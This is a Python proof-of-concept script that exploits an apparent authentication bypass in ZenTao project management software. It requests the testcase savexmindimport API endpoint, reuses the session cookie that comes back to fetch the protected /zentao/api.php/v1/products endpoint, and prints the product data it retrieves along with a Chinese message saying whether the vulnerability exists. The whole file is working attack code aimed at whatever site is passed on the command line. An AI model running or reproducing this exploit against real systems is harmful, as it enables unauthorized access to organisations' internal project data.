#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}

def verify(site):
    burp0_url = site + "/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=iwvpxtinanxkdbepbhnf&branch=swypdmgsqbunltuccwou"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15", "Connection": "close", "Accept-Encoding": "gzip"}
    r1 = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r1.status_code == 200:
        burp2_url = site + "/zentao/api.php/v1/products"
        burp0_headers["Cookie"] = r1.headers["Set-Cookie"]
        r2 = requests.get(burp2_url, headers=burp0_headers, verify=False)
        if r2.status_code == 200 and "products" in r2.json():
            return r2.json()
    return ""


    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询 /zentao/api.php/v1/products 接口的内容为：", info)
    else:
        print("[-]漏洞不存在")
